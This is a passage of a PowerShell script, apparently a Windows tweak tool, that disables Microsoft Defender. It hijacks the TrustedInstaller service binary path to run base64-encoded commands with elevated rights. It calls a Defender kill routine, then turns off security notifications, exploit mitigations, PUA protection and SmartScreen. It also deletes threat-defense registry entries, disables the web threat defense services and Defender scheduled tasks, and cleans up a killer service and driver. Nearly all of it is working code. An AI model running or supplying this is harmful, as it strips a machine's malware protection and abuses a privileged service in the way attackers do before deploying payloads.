[-HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKEY_CLASSES_ROOT\CLSID\{E48B2549-D510-4A76-8A5F-FC126A6215F0}]

[-HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{E48B2549-D510-4A76-8A5F-FC126A6215F0}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E48B2549-D510-4A76-8A5F-FC126A6215F0}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{E48B2549-D510-4A76-8A5F-FC126A6215F0}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Microsoft.OneCore.WebThreatDefense.Service.UserSessionServiceManager]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Microsoft.OneCore.WebThreatDefense.ThreatExperienceManager.ThreatExperienceManager]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Microsoft.OneCore.WebThreatDefense.ThreatResponseEngine.ThreatDecisionEngine]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Microsoft.OneCore.WebThreatDefense.Configuration.WTDUserSettings]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKLM\SOFTWARE\WOW6432Node\Classes\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]
'@

#exploit trusted installer service bin path
function Run-Trusted([String]$command) {

  try {
    Stop-Service -Name TrustedInstaller -Force -ErrorAction Stop -WarningAction Stop
  }
  catch {
    taskkill /im trustedinstaller.exe /f >$null
  }
  #get bin path to revert later
  $service = Get-CimInstance -ClassName Win32_Service -Filter "Name='TrustedInstaller'"
  $DefaultBinPath = $service.PathName
  #make sure path is valid and the correct location
  $trustedInstallerPath = "$env:SystemRoot\servicing\TrustedInstaller.exe"
  if ($DefaultBinPath -ne $trustedInstallerPath) {
    $DefaultBinPath = $trustedInstallerPath
  }
  #convert command to base64 to avoid errors with spaces
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  $base64Command = [Convert]::ToBase64String($bytes)
  #change bin to command
  sc.exe config TrustedInstaller binPath= "cmd.exe /c powershell.exe -encodedcommand $base64Command" | Out-Null
  #run the command
  sc.exe start TrustedInstaller | Out-Null
  #set bin back to default
  sc.exe config TrustedInstaller binpath= "`"$DefaultBinPath`"" | Out-Null
  try {
    Stop-Service -Name TrustedInstaller -Force -ErrorAction Stop -WarningAction Stop
  }
  catch {
    taskkill /im trustedinstaller.exe /f >$null
  }
  
}


Write-Host 'Running Initial Stage...'
Write-Host 'Using kill function from [https://github.com/wesmar/WinDefCtl]'
Invoke-Kill

#disable notifications and others that are allowed while defender is running
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableEnhancedNotifications' /t REG_DWORD /d '1' /f *>$null
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableNotifications' /t REG_DWORD /d '1' /f *>$null
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Virus and threat protection' /v 'SummaryNotificationDisabled' /t REG_DWORD /d '1' /f *>$null
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Virus and threat protection' /v 'NoActionNotificationDisabled' /t REG_DWORD /d '1' /f *>$null
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Virus and threat protection' /v 'FilesBlockedNotificationDisabled' /t REG_DWORD /d '1' /f *>$null
Reg.exe add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance' /v 'Enabled' /t REG_DWORD /d '0' /f *>$null
#exploit protection
Reg.exe add 'HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel' /v 'MitigationOptions' /t REG_BINARY /d '222222000001000000000000000000000000000000000000' /f *>$null
Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender' /v 'PUAProtection' /t REG_DWORD /d '0' /f"
Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' /v 'SmartScreenEnabled' /t REG_SZ /d 'Off' /f"
Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' /v 'AicEnabled' /t REG_SZ /d 'Anywhere' /f"

Write-Host 'Disabling Defender with Registry Hacks...' 

New-item -Path "$env:TEMP\disableReg" -ItemType Directory -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable1.reg" -Value $file1 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable2.reg" -Value $file2 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable3.reg" -Value $file3 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable5.reg" -Value $file5 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable6.reg" -Value $file6 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable7.reg" -Value $file7 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable8.reg" -Value $file8 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable9.reg" -Value $file9 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable10.reg" -Value $file10 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable11.reg" -Value $file11 -Force | Out-Null
$files = (Get-ChildItem -Path "$env:TEMP\disableReg").FullName
foreach ($file in $files) {
  $command = "Start-Process regedit.exe -ArgumentList `"/s $file`""
  Run-Trusted -command $command
  Start-Sleep 1
}

$svcs = @('webthreatdefsvc', 'webthreatdefusersvc') 
$svcs | Stop-Service -Force -ErrorAction SilentlyContinue
$svcs | foreach-object { sc.exe config "$_" start= disabled *>$null }

#disable tasks
$tasks = Get-ScheduledTask
foreach ($task in $tasks) {
  if ($task.Taskname -like 'Windows Defender*') {
    Disable-ScheduledTask -TaskName $task.TaskName -ErrorAction SilentlyContinue
  }
}

Write-Host 'Removing service, cleaning Up...Done!' -ForegroundColor Green
Remove-Item "$env:TEMP\disableReg" -Recurse -Force
Stop-KillerService
Remove-DriverFile
